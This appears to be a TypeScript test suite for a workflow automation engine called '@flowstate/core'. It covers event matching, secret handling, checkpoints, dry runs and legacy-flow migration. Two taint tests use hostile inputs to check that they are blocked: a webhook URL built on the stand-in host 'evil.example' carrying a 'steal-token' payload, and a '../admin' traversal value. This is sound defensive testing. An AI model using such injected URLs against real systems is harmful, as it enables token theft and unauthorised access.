import { describe, expect, it } from 'vite-plus/test';
import {
  executeFlow,
  matchesEvent,
  materializeSecrets,
  MAX_EVENT_HOPS,
  migrateLegacyFlow,
  parseBlock,
  parseCapability,
  parseEvent,
  parseFlow,
  resumeCheckpoint,
  sanitizeFlowForExport,
  type Event,
  type Flow,
} from './index';

function makeEvent(overrides: Partial<Event> = {}): Event {
  return {
    id: 'ev-1',
    type: 'device.battery.changed',
    source: 'device',
    author: 'device.battery',
    trust: 'trusted',
    hops: 0,
    payload: { level: 0.15, charging: false },
    createdAt: '2026-11-27T16:00:00.000Z',
    ...overrides,
  };
}

function makeFlow(overrides: Partial<Flow> = {}): Flow {
  return {
    id: 'flow-1',
    contextId: 'personal',
    name: 'Test Flow',
    trigger: { eventType: 'device.battery.changed' },
    inputs: [],
    steps: [],
    active: true,
    dryRun: false,
    executionTarget: 'device',
    createdAt: '2026-11-27T16:00:00.000Z',
    ...overrides,
  };
}

describe('@flowstate/core — matchesEvent', () => {
  it('supports edge-triggered threshold crossings', () => {
    const matcher = {
      eventType: 'device.battery.changed',
      edgeTriggered: true,
      where: [
        { field: 'event.payload.charging', operator: 'eq' as const, value: 'false' },
        { field: 'event.payload.level', operator: 'lte' as const, value: '0.2' },
      ],
    };

    const prevHigh = makeEvent({ payload: { level: 0.25, charging: false } });
    const nowLow = makeEvent({ payload: { level: 0.18, charging: false } });
    const stillLow = makeEvent({ payload: { level: 0.17, charging: false } });

    expect(matchesEvent(matcher, nowLow, { prevEvent: prevHigh })).toBe(true);
    expect(matchesEvent(matcher, stillLow, { prevEvent: nowLow })).toBe(false);
  });

  it('rejects expired events and enforces author allowlists', () => {
    const expired = makeEvent({ expiresAt: '2020-01-01T00:00:00.000Z' });
    expect(matchesEvent({ eventType: '*' }, expired, { now: Date.parse('2026-11-27T16:00:00Z') })).toBe(false);

    const fromStranger = makeEvent({ author: 'did:plc:stranger', source: 'space' });
    expect(matchesEvent({ eventType: '*', authors: ['did:plc:partner'] }, fromStranger)).toBe(false);
    expect(matchesEvent({ eventType: '*', authors: ['did:plc:stranger'] }, fromStranger)).toBe(true);
  });
});

describe('@flowstate/core — taint & Tier-0 secrets', () => {
  it('blocks untrusted event data from sensitive fields (e.g., webhook URL)', () => {
    const flow = makeFlow({
      trigger: { eventType: 'system.deeplink.received' },
      steps: [
        {
          kind: 'command',
          id: 'cmd-1',
          targetCapability: 'local.webhook',
          action: 'request',
          sensitiveFields: ['url', 'headers'],
          input: {
            url: 'https://evil.example/{{event.payload.path}}',
            body: 'Safe body: {{event.payload.path}}',
          },
        },
      ],
    });

    const untrustedEvent = makeEvent({
      type: 'system.deeplink.received',
      source: 'deep-link',
      trust: 'untrusted',
      payload: { path: 'steal-token' },
    });

    const res = executeFlow(flow, untrustedEvent, { now: 1000, createId: () => 'id-1' });
    expect(res.status).toBe('failed');
    expect(res.commands).toHaveLength(0);
    expect(res.trace.steps[0]?.error).toMatch(/Untrusted data/);
  });

  it('propagates untrusted taint through derived variables', () => {
    const flow = makeFlow({
      trigger: { eventType: 'space.msg' },
      steps: [
        { kind: 'variable', id: 'v1', name: 'derived', value: 'prefix-{{event.payload.slug}}' },
        {
          kind: 'command',
          id: 'c1',
          targetCapability: 'local.webhook',
          action: 'request',
          sensitiveFields: ['url'],
          input: { url: 'https://api.example/{{derived}}' },
        },
      ],
    });

    const res = executeFlow(
      flow,
      makeEvent({ type: 'space.msg', source: 'space', trust: 'untrusted', payload: { slug: '../admin' } }),
    );
    expect(res.status).toBe('failed');
    expect(res.commands).toHaveLength(0);
  });

  it('keeps Tier-0 secrets out of Command.input and RunTrace until adapter dispatch', () => {
    const flow = makeFlow({
      steps: [
        { kind: 'variable', id: 'v-sec', name: 'haToken', secret: true },
        {
          kind: 'command',
          id: 'c-wh',
          targetCapability: 'local.webhook',
          action: 'request',
          sensitiveFields: ['url', 'headers'],
          input: {
            url: 'https://ha.local/api/services/light/turn_on',
            headers: { Authorization: 'Bearer {{secrets.haToken}}' },
            body: 'Battery {{event.payload.level}}',
          },
        },
      ],
    });

    const res = executeFlow(flow, makeEvent(), { now: 1000, createId: () => 'cmd-1' });
    expect(res.status).toBe('completed');
    expect(res.commands).toHaveLength(1);
    expect(res.commands[0]?.secretRefs).toEqual({ haToken: 'haToken' });
    expect((res.commands[0]?.input.headers as Record<string, string>).Authorization).toBe('Bearer {{secrets.haToken}}');

    const materialized = materializeSecrets(
      (res.commands[0]?.input.headers as Record<string, string>).Authorization,
      (k) => (k === 'haToken' ? 'super-secret-value' : undefined),
    );
    expect(materialized).toEqual({ ok: true, value: 'Bearer super-secret-value' });
  });
});

describe('@flowstate/core — async Space commands, checkpoints & dryRun', () => {
  it('checkpoints on awaitReply and resumes downstream steps when correlated reply arrives', () => {
    let seq = 0;
    const createId = () => `id-${++seq}`;

    const flow = makeFlow({
      contextId: 'ctx-work',
      trigger: { eventType: 'user.manual.invoked' },
      steps: [
        {
          kind: 'command',
          id: 'step-create-issue',
          bindAs: 'issue',
          targetCapability: 'did:plc:linear-bridge',
          action: 'createIssue',
          space: 'at://did:plc:me/app.flowstate.space.context/work',
          input: { title: '{{inputs.title}}' },
          awaitReply: { timeoutMs: 30_000 },
        },
        {
          kind: 'command',
          id: 'step-copy',
          targetCapability: 'local.clipboard',
          action: 'write',
          input: { text: 'Created: {{issue.url}}' },
        },
      ],
    });

    const start = executeFlow(
      flow,
      makeEvent({ type: 'user.manual.invoked', source: 'manual', payload: {} }),
      { now: 10_000, inputs: { title: 'Ship vNext' }, createId },
    );

    expect(start.status).toBe('paused');
    expect(start.commands).toHaveLength(1);
    expect(start.commands[0]?.targetCapability).toBe('did:plc:linear-bridge');
    expect(start.commands[0]?.input).toEqual({ title: 'Ship vNext' });
    expect(start.checkpoints).toHaveLength(1);
    expect(start.checkpoints[0]?.reason).toBe('awaitReply');
    expect(start.checkpoints[0]?.awaitingCommandId).toBe(start.commands[0]?.id);

    // Simulated reply from @linear-bridge in the Context Space
    const replyEvent = makeEvent({
      id: 'ev-reply',
      type: 'linear.issue.created',
      source: 'space',
      author: 'did:plc:linear-bridge',
      replyTo: start.commands[0]?.id,
      trust: 'untrusted',
      payload: { url: 'https://linear.app/issue/FS-42' },
    });

    const resumed = resumeCheckpoint(flow, start.checkpoints[0]!, replyEvent, { now: 12_000, createId });
    expect(resumed.status).toBe('completed');
    expect(resumed.commands).toHaveLength(1);
    expect(resumed.commands[0]?.targetCapability).toBe('local.clipboard');
    expect(resumed.commands[0]?.input).toEqual({ text: 'Created: https://linear.app/issue/FS-42' });
  });

  it('produces a full trace with zero side effects in dryRun mode', () => {
    const flow = makeFlow({
      dryRun: true,
      steps: [
        {
          kind: 'condition',
          id: 'cond-1',
          assertions: [{ field: 'event.payload.level', operator: 'lt', value: '0.2' }],
          then: [
            {
              kind: 'command',
              id: 'cmd-1',
              targetCapability: 'local.notification',
              action: 'show',
              input: { title: 'Low battery' },
            },
          ],
        },
      ],
    });

    const res = executeFlow(flow, makeEvent({ payload: { level: 0.1 } }));
    expect(res.status).toBe('dry-run');
    expect(res.commands).toHaveLength(0);
    expect(res.checkpoints).toHaveLength(0);
    expect(res.trace.steps).toHaveLength(2);
    expect(res.trace.steps[0]?.branch).toBe('then');
    expect(res.trace.steps[1]?.status).toBe('dry-run');
  });

  it('enforces MAX_EVENT_HOPS loop guard', () => {
    const res = executeFlow(makeFlow(), makeEvent({ hops: MAX_EVENT_HOPS + 1 }));
    expect(res.status).toBe('failed');
    expect(res.trace.steps[0]?.stepId).toBe('__hop_guard');
  });
});

describe('@flowstate/core — Zod trust boundary & migrations', () => {
  it('validates Event, Capability, Flow, and Block schemas', () => {
    expect(parseEvent(makeEvent()).ok).toBe(true);
    expect(parseFlow(makeFlow()).ok).toBe(true);
    expect(parseBlock({ id: 'b1', title: 'Focus', kind: 'focus', startMin: 540, endMin: 660 }).ok).toBe(true);
    expect(parseBlock({ id: 'b2', title: 'Bad', kind: 'focus', startMin: 600, endMin: 500 }).ok).toBe(false);

    const cap = parseCapability({
      id: 'did:plc:linear-bridge',
      kind: 'bridge',
      name: 'Linear Bridge',
      did: 'did:plc:linear-bridge',
      emits: [{ type: 'linear.issue.assigned', label: 'Issue Assigned', fields: [] }],
      accepts: [
        {
          action: 'createIssue',
          label: 'Create Issue',
          inputs: [{ name: 'title', label: 'Title', type: 'string', required: true }],
        },
      ],
      runtimes: ['remote-did'],
      permissions: [],
    });
    expect(cap.ok).toBe(true);
  });

  it('migrates legacy v2 battery + webhook flows cleanly and sanitizes exports', () => {
    const migrated = migrateLegacyFlow({
      id: 'legacy-1',
      name: 'Low Battery Alert',
      active: true,
      trigger: { type: 'NATIVE_BATTERY', details: { charging: false, level: 0.2 } },
      steps: [
        { kind: 'variable', id: 'v1', name: 'token', varKind: 'secret', value: 'should-not-leak' },
        {
          kind: 'action',
          id: 'a1',
          action: { type: 'WEBHOOK', details: { url: 'https://example.com/hook', method: 'POST' } },
        },
      ],
    });

    expect(migrated.trigger.eventType).toBe('device.battery.changed');
    expect(migrated.trigger.edgeTriggered).toBe(true);
    expect(migrated.steps[1]).toMatchObject({
      kind: 'command',
      targetCapability: 'local.webhook',
      action: 'request',
      sensitiveFields: ['url', 'headers'],
    });

    const exported = sanitizeFlowForExport(migrated);
    expect((exported.steps[0] as { value?: string }).value).toBeUndefined();
  });
});
